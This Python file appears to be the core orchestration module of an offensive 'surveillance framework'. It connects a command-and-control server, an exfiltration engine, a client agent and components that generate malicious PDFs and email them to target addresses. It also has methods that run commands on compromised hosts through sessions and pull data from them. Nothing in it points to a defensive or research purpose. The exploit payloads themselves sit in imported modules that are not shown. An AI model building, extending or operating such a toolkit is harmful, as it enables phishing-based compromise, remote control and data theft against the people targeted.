import os
import sys
import signal
import threading
import time
import logging
from c2.c2_server import C2Server
from c2.comms_manager import CommsManager
from core.session_manager import SessionManager
from core.database_manager import DatabaseManager
from core.client_agent import ClientAgent
from core.config_manager import ConfigManager
from evasion.exfil_engine import ExfiltrationEngine
from exploitation.pdf_exploiter import PDFExploiter
from tools.pdf_deployer import PDFDeployer

class Framework:
    def __init__(self, config_path="config.json"):
        self.config_manager = ConfigManager(config_path)
        self.db_manager = DatabaseManager(self.config_manager)
        self.session_manager = SessionManager(self.db_manager)

    # Fix: Create C2 URL for ExfilEngine with correct port
        c2_host = self.config_manager.get('c2.host', 'localhost')
        c2_port = self.config_manager.get('c2.port')  # Use the same port as CommsManager
        c2_url = f"https://{c2_host}:{c2_port}"  # Use HTTPS since we're using SSL

        self.exfil_engine = ExfiltrationEngine(c2_url)
        self.comms_manager = CommsManager(self.config_manager, self.session_manager, self.exfil_engine)
    
    # Only initialize C2Server if http_port is different from the main port
        http_port = self.config_manager.get('c2.http_port')
        if http_port and http_port != c2_port:
            self.c2_server = C2Server(self.config_manager, self.session_manager, self.exfil_engine)
            self.c2_server.port = http_port  # Override the default port
        else:
            self.c2_server = None  # We'll use CommsManager for all connections
        
        self.pdf_exploiter = PDFExploiter(self.config_manager, self.db_manager)
        self.pdf_deployer = PDFDeployer(self.db_manager, config_path)

        log_level = self.config_manager.get('framework.logging_level', 'INFO')  # Fixed path to log level
        logging.basicConfig(
            level=getattr(logging, str(log_level).upper(), logging.INFO),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )

        self.logger = logging.getLogger(__name__)
        self.running = False
        self.threads = []

    # In core/framework.py, fix the start_client_agent method:

    def start_client_agent(self):
        """Start the client agent for data collection and exfiltration"""
        c2_host = self.config_manager.get('c2.host', 'localhost')
        c2_port = self.config_manager.get('c2.port')  # Use the same port as CommsManager
        c2_url = f"https://{c2_host}:{c2_port}"  # Use HTTPS since we're using SSL

        self.client_agent = ClientAgent(c2_url)
        return self.client_agent

    def initialize(self):
        """Initialize all framework components"""
        try:
            self.logger.info("Initializing framework...")
            
            # Initialize database
            self.db_manager.initialize()
            self.db_manager.create_tables()
            self.logger.info("Database initialized")
            
            # Initialize session manager
            # self.session_manager.initialize()
            self.logger.info("Session manager initialized")
            
            # Initialize exfiltration engine
            # self.exfil_engine.initialize()
            self.logger.info("Exfiltration engine initialized")
            
            # Initialize communication manager
            # self.comms_manager.initialize()
            self.logger.info("Communication manager initialized")
            
            # Initialize C2 server
            # self.c2_server.initialize()
            self.logger.info("C2 server initialized")
            
            self.logger.info("Framework initialization complete")
            return True
        except Exception as e:
            self.logger.error(f"Framework initialization failed: {str(e)}")
            return False

    def start(self):
        """Start the framework and all components"""
        if self.running:
            self.logger.warning("Framework is already running")
            return
    
        self.logger.info("Starting surveillance framework...")
        self.running = True
    
        try:
        # Start database manager
            self.logger.info("Database manager initialized")
        
        # Start communications manager (this will start the Flask server)
            self.comms_manager.start()
            self.logger.info("Communications manager started")
        
        # Don't start C2 server separately anymore as it's handled by CommsManager
        # The C2Server should only be used for additional functionality if needed
        
        # Start PDF exploiter
            self.pdf_exploiter.start()
            self.logger.info("PDF exploiter started")
        
        # Start PDF deployer
            self.pdf_deployer.start()
            self.logger.info("PDF deployer started")
        
            self.logger.info("Framework started successfully")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to start framework: {str(e)}")
            self.stop()
            raise

    def stop(self):
        """Stop all framework components with failure isolation"""
        errors = []
        
        # Stop C2 server first
        try:
            if hasattr(self, 'comms_manager'):
                self.comms_manager.stop()
        except Exception as e:
            errors.append(f"C2 server: {str(e)}")
            
        # Stop database connections
        try:
            if hasattr(self, 'db_manager'):
                self.db_manager.close()
        except Exception as e:
            errors.append(f"Database: {str(e)}")
            
        # Stop other components
        try:
            if hasattr(self, 'persistence_manager'):
                self.persistence_manager.cleanup()
        except Exception as e:
            errors.append(f"Persistence manager: {str(e)}")
            
        # Report any errors that occurred
        if errors:
            print("[!] Errors during shutdown:")
            for error in errors:
                print(f"  - {error}")
        else:
            print("[+] Framework shutdown successfully")
            
        return len(errors) == 0

    def signal_handler(self, signum, frame):
        """Handle system signals for graceful shutdown"""
        self.logger.info(f"Received signal {signum}, shutting down...")
        self.stop()
        sys.exit(0)

    def restart(self):
        """Restart the framework"""
        self.logger.info("Restarting framework...")
        self.stop()
        time.sleep(2)
        return self.start()

    def status(self):
        """Get the current status of the framework"""
        return {
            'running': self.running,
            'c2_server': self.c2_server.running if hasattr(self.c2_server, 'running') else 'unknown',
            'comms_manager': self.comms_manager.running if hasattr(self.comms_manager, 'running') else 'unknown',
            'exfil_engine': self.exfil_engine.running if hasattr(self.exfil_engine, 'running') else 'unknown',
            'active_sessions': len(self.session_manager.get_active_sessions()),
            'threads': len(self.threads)
        }

    def create_and_deploy_pdf(self, target_email, template_type="invoice", subject=None):
        """Create and deploy a malicious PDF to the target"""
        try:
            self.logger.info(f"Creating and deploying malicious PDF to {target_email}")
            
            # Generate the malicious PDF
            c2_host = self.config_manager.get('c2.host', 'localhost')
            c2_port = self.config_manager.get('c2.port')
            pdf_content = self.pdf_exploiter.generate_malicious_pdf(
                template_type=template_type,
                c2_host=c2_host,
                c2_port=c2_port
            )
            
            # Deploy the PDF
            filename = self.pdf_deployer.create_and_send_pdf(
                target_email=target_email,
                template_type=template_type,
                subject=subject
            )
            
            self.logger.info(f"Malicious PDF deployed successfully: {filename}")
            return filename
        except Exception as e:
            self.logger.error(f"Failed to deploy malicious PDF: {str(e)}")
            return None

    def get_active_sessions(self):
        """Get all active sessions"""
        return self.session_manager.get_active_sessions()

    def get_session_data(self, session_id):
        """Get data for a specific session"""
        return self.session_manager.get_session(session_id)

    def execute_command(self, session_id, command):
        """Execute a command on a target"""
        return self.comms_manager.dispatch_command(session_id, command)

    def exfiltrate_data(self, session_id, data_type=None):
        """Exfiltrate data from a target"""
        return self.exfil_engine.exfiltrate(session_id, data_type)

def main():
    """Main entry point for the framework"""
    framework = Framework()
    
    if not framework.initialize():
        print("Failed to initialize framework")
        return 1
    
    if not framework.start():
        print("Failed to start framework")
        return 1
    
    try:
        print("Framework is running. Press Ctrl+C to stop.")
        while framework.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down framework...")
    
    framework.stop()
    return 0

if __name__ == "__main__":
    sys.exit(main())
